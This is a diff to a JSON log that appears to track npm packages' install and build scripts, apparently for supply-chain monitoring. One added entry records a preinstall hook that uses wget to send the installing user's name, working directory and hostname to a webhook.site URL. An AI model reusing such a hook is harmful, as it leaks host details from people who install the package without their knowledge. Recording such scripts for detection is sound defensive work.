@@ -1,5 +1,86 @@
 [
   {
+    "packageName": "hemi-btc-staking-actions",
+    "version": "10.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "wget --quiet \"https://webhook.site/9df324a5-8e21-40da-bd6d-c6840b6cbd99?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T11:26:14.365Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@heartlandone/vega-sandbox-pr-2588-8c4e85ab9041145b0d2d16d60f59f16cc45e332e",
+    "version": "2.72.0",
+    "scriptType": "postbuild",
+    "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T11:20:22.821Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.14",
+    "scriptType": "postinstall",
+    "scriptContent": "node postinstall.js",
+    "previousVersion": "1.0.13",
+    "timestamp": "2026-01-23T11:11:57.669Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.14",
+    "scriptType": "preinstall",
+    "scriptContent": "node preinstall.js",
+    "previousVersion": "1.0.13",
+    "timestamp": "2026-01-23T11:11:57.667Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "claude-code-safe",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T11:11:55.997Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "claude-code-safe",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "node scripts/check-conflicts.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T11:11:55.994Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@openameba/spindle-ui",
+    "version": "3.1.5",
+    "scriptType": "prebuild",
+    "scriptContent": "pnpm clean",
+    "previousVersion": "3.1.4",
+    "timestamp": "2026-01-23T11:09:31.777Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.14",
+    "scriptType": "postinstall",
+    "scriptContent": "node postinstall.js",
+    "previousVersion": "1.0.13",
+    "timestamp": "2026-01-23T11:08:25.768Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "rank4222wun",
+    "version": "1.0.14",
+    "scriptType": "preinstall",
+    "scriptContent": "node preinstall.js",
+    "previousVersion": "1.0.13",
+    "timestamp": "2026-01-23T11:08:25.730Z",
+    "issuesend": false
+  },
+  {
     "packageName": "rank4222wun",
     "version": "1.0.12",
     "scriptType": "postinstall",
